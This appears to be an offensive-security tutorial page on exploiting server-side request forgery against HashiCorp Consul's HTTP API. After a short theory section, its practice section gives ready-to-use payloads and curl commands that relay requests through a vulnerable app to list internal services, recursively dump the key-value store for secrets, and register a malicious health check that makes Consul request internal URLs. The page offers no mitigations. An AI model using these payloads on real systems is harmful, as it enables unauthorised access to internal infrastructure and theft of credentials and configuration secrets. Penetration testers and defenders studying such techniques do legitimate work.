---
title: Exploiting SSRF in HashiCorp Consul APIs
description: Harness SSRF vulnerabilities to exploit HashiCorp Consul for internal
  service interaction
keywords:
- HashiCorp Consul
- SSRF
- service discovery
- HTTP API
- vulnerability exploitation
- internal services
---

# HashiCorp Consul

## Context

HashiCorp Consul is a service mesh solution that enables service discovery, configuration, and segmentation in distributed systems. This article demonstrates how an adversary can exploit Server-Side Request Forgery (SSRF) vulnerabilities targeting Consul's HTTP APIs to interact with internal services and access sensitive information. A solid understanding of HTTP protocol mechanics, API endpoint enumeration, basic SSRF exploitation techniques, and service discovery concepts is assumed.

## Theory

### Consul HTTP API Exposure and Attack Surface

Consul provides a robust API used by applications to query and register services. This API is exposed through HTTP, often accessible from internal network segments. By default, some Consul deployments may lack authentication, widening the attack surface for potential exploits. Through a successful SSRF attack, a malicious actor can relay their requests to these exposed Consul APIs, circumventing internal network security measures like segmentation.

### Health Check and Redirect SSRF in Consul

Consul's API includes health check functionality, which can be manipulated to perform HTTP requests to arbitrary internal URLs. By crafting SSRF payloads to target health check or redirect endpoints, an attacker can effectively interact with various internal services, often bypassing traditional security constraints and accessing otherwise restricted endpoints.

### Internal API Enumeration and Data Exposure

The Consul API exposes critical data, such as service listings, node metadata, and key-value store contents. Utilizing SSRF, attackers can target these endpoints to leak sensitive data, including service topology, credentials, or secret configurations. This allows the adversary to gather valuable intelligence on the internal architecture of the target network.

## Practice

### Enumerate Consul Services via SSRF

To enumerate services registered in Consul, an attacker can exploit SSRF to target the service enumeration endpoint.

- **Payload**:  
   ```http
   http://127.0.0.1:8500/v1/catalog/services
   ```
   This is the SSRF payload that forms the target URL of the internal Consul API.

- **Command Line**:  
   ```bash
   curl -X GET 'http://vulnerable-app/ssrf?url=http://127.0.0.1:8500/v1/catalog/services'
   ```
   This command uses curl to trigger the SSRF vulnerability, relaying the crafted request to retrieve the list of internal services from Consul.

- **Outcome**:  
   The attacker retrieves a list of internal services registered in Consul, gaining insight into the network's service structure and potential targets for further exploration.

### Extract Key-Value Secrets via SSRF

An attacker can also target the key-value store within Consul to extract sensitive configuration information.

- **Payload**:  
   ```http
   http://127.0.0.1:8500/v1/kv?recurse
   ```
   By invoking this command, the attacker coerces the application to relay their request, accessing potentially sensitive data stored in Consul's key-value storage.

- **Outcome**:  
   The attacker accesses sensitive configuration details or secrets stored within the Consul key-value store, potentially exposing credentials or other sensitive information.

### Trigger Internal HTTP Requests via Consul Health Checks

Attacking Consul's health check functionality involves registering a malicious health check to direct internal HTTP requests.

- **Payload JSON**:  
   ```json
   {
       "Name": "ssrf-check",
       "HTTP": "http://internal-service.local/secret",
       "Interval": "10s"
   }
   ```
   This payload is used to register a health check with a controlled HTTP target.

- **Command Line**:  
   ```bash
   curl -X PUT --data-binary @payload.json 'http://vulnerable-app/ssrf?url=http://127.0.0.1:8500/v1/agent/check/register'
   ```
   The attacker submits the health check registration through the SSRF point to force Consul to make a request to an internal resource controlled by the attacker.

- **Outcome**:  
   By leveraging this technique, Consul is manipulated into making HTTP requests to internal endpoints specified by the attacker, potentially opening avenues for further exploitation and SSRF chaining.

## Tools

- **curl**
- **Burp Suite**